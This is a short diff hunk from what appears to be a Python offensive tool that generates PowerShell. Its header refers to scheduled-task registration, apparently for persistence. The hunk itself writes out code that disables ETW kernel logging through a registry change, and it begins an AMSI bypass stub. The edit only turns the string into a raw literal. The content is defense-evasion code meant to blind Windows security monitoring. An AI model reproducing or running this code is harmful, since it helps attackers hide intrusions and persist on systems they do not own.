@@ -399,7 +399,7 @@ Register-ScheduledTask -TaskName '{task_name}' -Action $action -Trigger $trigger
         # ETW/AMSI: In-mem PS
         log.info("  📡 ETW/AMSI disable...")
         try:
-            ps = '''
+            ps = r'''
 $etw = "HKLM:System\CurrentControlSet\Control\WMI\Autologger\Circular Kernel Context Logger"
 Set-ItemProperty -Path $etw -Name "Start" -Value 0 -Force
 # AMSI bypass stub
